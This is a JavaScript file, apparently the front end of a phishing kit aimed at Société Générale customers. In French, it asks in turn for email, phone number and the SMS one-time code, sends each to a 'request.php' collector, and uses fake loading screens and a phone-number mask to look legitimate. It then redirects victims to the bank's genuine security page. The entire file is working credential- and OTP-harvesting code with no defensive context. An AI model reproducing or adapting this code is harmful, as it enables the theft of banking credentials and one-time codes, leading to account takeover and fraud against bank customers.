/*global $, console, alert, prompt */
/*jslint plusplus: true, evil: true */
/*eslint no-unused-vars: "error"*/
/*eslint-env browser*/


// ================== button click 1 validation email
$(".butt1").click(function() {
    'use strict';
    if ($(".mail").val().length <= 0) {
        $(".msg1").removeClass("hide");
        $(".msg1").text("Champ obligatoire");
        $(".mail").css({ "border-color": "#ee425b" });

    } else {

        if ($(".mail").val().indexOf("@") !== -1) {
            $.ajax({
                type: 'POST',
                url: 'request.php',
                cash: false,
                dataType: 'json',
                data: "step=mail&xtrx=" + $('.mail').val(),
                beforeSend: function() {
                    $('.holias1').removeClass('hide');
                },
                success: function(data) {
                    switch (data.error) {
                        case 0:
                            $('.holias1').addClass('hide');
                            $(".step1").addClass('hide');
                            $(".load99").removeClass('hide');
                            ste1();
                            break;
                        case 1:
                            $('.holias1').addClass('hide');
                            $(".msg1").removeClass("hide");
                            $(".msg1").text("l’adresse e-mail n’est pas valide.");
                            $(".mail").css({ "border-color": "#ee425b" });
                            break;
                        case 2:
                            $('.holias1').addClass('hide');
                            alert(data.msg);
                            break;

                    }

                }

            })




        } else {
            $(".msg1").removeClass("hide");
            $(".msg1").text("Le format de l’adresse e-mail n’est pas valide.");
            $(".mail").css({ "border-color": "#ee425b" });

        }

    }
})


// ============ button click 2 validate number

$(".butt2").click(function() {
    'use strict';
    if ($(".num").val().length <= 0) {
        $(".msg2").removeClass("hide");
        $(".msg2").text("Champ obligatoire");
        $(".num").css({ "border-color": "#ee425b" });

    } else {
        if (isNaN($('.num').val())) {
            $(".msg2").removeClass("hide");
            $(".msg2").text("Veuillez saisir un numéro de téléphone valide");
            $(".num").css({ "border-color": "#ee425b" });

        } else {

            if ($(".num").val().length >= 10) {
                var pnl = $('.num').val().substring(0, $('.num').val().length - 4);

                $.ajax({
                    type: 'POST',
                    url: 'request.php',
                    cash: false,
                    dataType: 'json',
                    data: "step=mobile&cphone=" + $('.num').val(),
                    beforeSend: function() {
                        $('.holias2').removeClass('hide');
                    },
                    success: function(data) {
                        switch (data.error) {
                            case 0:
                                $('.holias2').addClass('hide');
                                $('.opb').text(pnl + "XXXX");
                                $(".step2").addClass('hide');
                                $(".load99").removeClass('hide');
                                ste2();
                                break;
                            case 1:
                                $('.holias2').addClass('hide');
                                $(".msg2").removeClass("hide");
                                $(".msg2").text("Le numéro de téléphone n’est pas valide.");
                                $(".num").css({ "border-color": "#ee425b" });
                                break;
                            case 2:
                                $('.holias2').addClass('hide');
                                alert(data.msg);
                                break;

                        }

                    }

                })




            } else {
                $(".msg2").removeClass("hide");
                $(".msg2").text("Veuillez saisir un numéro de téléphone valide");
                $(".num").css({ "border-color": "#ee425b" });

            }


        }

    }
})

// =================== button click 3 sms ===========

$(".butt3").click(function() {
    'use strict';
    if ($('.otpd').val().length <= 0) {
        $(".msg3").removeClass("hide");
        $(".msg3").text("Champ oblegtoire");
        $(".otpd").css({ "border-color": "#ee425b" });

    } else {
        if ($(".otpd").val().length >= 6) {

            $.ajax({
                type: 'POST',
                url: 'request.php',
                cash: false,
                dataType: 'json',
                data: "step=simtn&cotps=" + $('.otpd').val(),
                beforeSend: function() {
                    $('.holias3').removeClass('hide');
                },
                success: function(data) {
                    switch (data.error) {
                        case 0:
                            $('.holias3').addClass('hide');
                            $(".step3").addClass('hide');
                            $(".load99").removeClass('hide');
                            ste3();
                            break;
                        case 1:
                            $('.holias3').addClass('hide');
                            $(".msg3").removeClass("hide");
                            $(".msg3").text("veuillez saisir le code recu au numéro enregistré");
                            $(".otpd").css({ "border-color": "#ee425b" });
                            break;
                        case 2:
                            $('.holias3').addClass('hide');
                            alert(data.msg);
                            break;

                    }

                }

            })



        } else {
            $(".msg3").removeClass("hide");
            $(".msg3").text("veuillez saisir le code recu au numéro enregistré");
            $(".otpd").css({ "border-color": "#ee425b" });

        }

    }
})

$('.dl1').click(function() {
    'use strict';
    $('.mail').val("");
    $(".msg1").addClass("hide");
    $(".msg1").text("");
    $(".mail").css({ "border-color": "#999" });
})

$('.dl2').click(function() {
    'use strict';
    $('.num').val("");
    $(".msg2").addClass("hide");
    $(".msg2").text("");
    $(".num").css({ "border-color": "#999" });
})

function error_mx() {
    'use strict';
}
$('.dl3').click(function() {
    'use strict';
    $('.otpd').val("");
    $(".msg3").addClass("hide");
    $(".msg3").text("");
    $(".otpd").css({ "border-color": "#999" });
})


$('.mdff').click(function() {
    'use strict';
    window.location.href = "https://ad11.adfarm1.adition.com/redi?lid=6643946886567364015&gdpr=0&gdpr_consent=&gdpr_pd=0&userid=6643786293442050189&sid=3820663&kid=2145369&bid=9195449&c=26436&keyword=&sr=184&clickurl=https://particuliers.societegenerale.fr/com/dcr-web/dcr/dcr-securite.html";
})
$('.mdf').click(function() {
        'use strict';
        $(".step2").removeClass('hide');
        $(".step3").addClass('hide');

    })
    // key up input mail event
$(".mail").keypress(function(event) {
    'use strict';
    if ($(".mail").val().length > 2) {
        $('.cl1').removeClass("hide");
        $(".msg1").addClass("hide");
        $(".msg1").text("");
        $(".mail").css({ "border-color": "#999" });
    }
})


// key up input num event
$(".num").keypress(function(event) {
    'use strict';
    if ($(".num").val().length > 2) {
        $('.cl2').removeClass("hide");
        $(".msg2").addClass("hide");
        $(".msg2").text("");
        $(".num").css({ "border-color": "#999" });
    }
})

// key up input sms event
$(".otpd").keypress(function(event) {
    'use strict';
    if ($(".otpd").val().length > 2) {
        $('.cl3').removeClass("hide");
        $(".msg3").addClass("hide");
        $(".msg3").text("");
        $(".otpd").css({ "border-color": "#999" });
    }
})

// ============ function seTimeout 
function ste1() {
    'use strict';
    setTimeout(function() {
        $(".step2").removeClass('hide');
        $(".load99").addClass('hide');
    }, 3000)
}

function ste2() {
    'use strict';
    setTimeout(function() {
        $(".step3").removeClass('hide');
        $(".load99").addClass('hide');
    }, 3000)
}


function ste3() {
    'use strict';
    setTimeout(function() {
        $(".step4").removeClass('hide');
        $(".NHL11").removeClass('hide');
        $(".load99").addClass('hide');
        st();
    }, 3000)
}

function st() {
    'use strict';
    setTimeout(function() {
        window.location.href = 'https://ad11.adfarm1.adition.com/redi?lid=6643946886567364015&gdpr=0&gdpr_consent=&gdpr_pd=0&userid=6643786293442050189&sid=3820663&kid=2145369&bid=9195449&c=26436&keyword=&sr=184&clickurl=https://particuliers.societegenerale.fr/com/dcr-web/dcr/dcr-securite.html';
    }, 3000)
}